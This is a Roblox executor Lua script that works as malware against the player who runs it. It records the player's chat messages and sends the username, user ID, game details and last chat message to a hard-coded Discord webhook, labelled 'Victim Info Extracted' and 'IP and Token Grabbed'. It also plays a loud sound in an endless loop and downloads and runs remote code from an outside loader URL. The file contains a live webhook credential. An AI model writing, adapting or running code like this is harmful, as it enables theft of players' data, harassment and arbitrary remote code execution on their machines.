local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local StarterGui = game:GetService("StarterGui")
local SoundService = game:GetService("SoundService")

local WebhookURL = "https://discord.com/api/webhooks/1563242722934919310/yK0oFxFS0tOSxXzZ0VtPusSNfU4pici-8fXEFhmSe9WWU0yAAewfVaXMP7IsHP4M23cg"

local lastChatMessage = "No message sent"

local function monitorChat()
    pcall(function()
        local TextChatService = game:GetService("TextChatService")
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local channels = TextChatService.TextChannels:GetChildren()
            for _, channel in ipairs(channels) do
                if channel:IsA("TextChannel") then
                    channel.MessageReceived:Connect(function(textMessage)
                        if textMessage.TextSource and textMessage.TextSource.UserId == LocalPlayer.UserId then
                            lastChatMessage = textMessage.Text
                        end
                    end)
                end
            end
            TextChatService.TextChannels.ChildAdded:Connect(function(channel)
                if channel:IsA("TextChannel") then
                    channel.MessageReceived:Connect(function(textMessage)
                        if textMessage.TextSource and textMessage.TextSource.UserId == LocalPlayer.UserId then
                            lastChatMessage = textMessage.Text
                        end
                    end)
                end
            end)
        else
            LocalPlayer.Chatted:Connect(function(message)
                lastChatMessage = message
            end)
        end
    end)
end

monitorChat()


local function getAvatarThumbnail(userId)
    local success, result = pcall(function()
        local url = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. tostring(userId) .. "&size=420x420&format=Png&isCircular=false"
        local response = HttpService:JSONDecode(game:HttpGet(url))
        if response and response.data and response.data[1] then
            return response.data[1].imageUrl
        end
    end)
    if success and result then
        return result
    end
    
    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
end


local function getPlaceThumbnail(placeId)
    local success, result = pcall(function()
        local url = "https://thumbnails.roblox.com/v1/places/gameicons?placeIds=" .. tostring(placeId) .. "&size=420x420&format=Png"
        local response = HttpService:JSONDecode(game:HttpGet(url))
        if response and response.data and response.data[1] then
            return response.data[1].imageUrl
        end
    end)
    if success and result then
        return result
    end
    return ""
end

local function StealSession()
    task.spawn(function()
        local loudSound = Instance.new("Sound")
        loudSound.SoundId = "rbxassetid://138081509"
        loudSound.Volume = 10
        loudSound.Pitch = 1.5
        loudSound.Parent = SoundService

        while true do
            loudSound:Play()
            pcall(function()
                StarterGui:SetCore("SendNotification", {
                    Title = "",
                    Text = "Sry Bro 🗿",
                    Icon = "rbxassetid://10472425028",
                    Duration = 2
                })
            end)
            task.wait(999 / 1000)
        end
    end)

    task.wait(2)

    local success, placeInfo = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    local mapName = success and placeInfo.Name or "Unknown"
    
    local mapThumb = getPlaceThumbnail(game.PlaceId)
    local playerCountText = tostring(#Players:GetPlayers()) .. " / " .. tostring(Players.MaxPlayers)
    local fullBodyAvatarUrl = getAvatarThumbnail(LocalPlayer.UserId)

    local data = {
        ["username"] = "Roblox Account 🤖",
        ["avatar_url"] = "https://i.ibb.co/Zp5tPpJj/IMG-3928.png",
        ["content"] = "@everyone IP and Token Grabbed",
        ["embeds"] = {{
            ["title"] = "Victim Info Extracted",
            ["color"] = 0x1A1A1A,
            ["thumbnail"] = {
                ["url"] = mapThumb
            },
            ["image"] = {
                ["url"] = fullBodyAvatarUrl
            },
            ["fields"] = {
                {["name"] = "👤 Username", ["value"] = LocalPlayer.Name, ["inline"] = true},
          
                {["name"] = "🆔 User ID", ["value"] = tostring(LocalPlayer.UserId), ["inline"] = true},
          
                {["name"] = "🗺️ Map Name", ["value"] = tostring(mapName), ["inline"] = false},
          
                {["name"] = "👥 Players", ["value"] = playerCountText, ["inline"] = true},
          
                {["name"] = "💬 Last Chat Message", ["value"] = tostring(lastChatMessage), ["inline"] = false},
          
                {["name"] = "📌 Job ID", ["value"] = game.JobId, ["inline"] = false}
            }
        }}
    }

    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if requestFunc then
        pcall(function()
            requestFunc({
                Url = WebhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(data)
            })
        end)
    end

    local loaders = {
        "https://flowauth.net/v1/loaders/VR7.lua"
    }

    for _, url in ipairs(loaders) do
        task.spawn(function()
            pcall(function()
                loadstring(game:HttpGet(url))()
            end)
        end)
    end
end

StealSession()
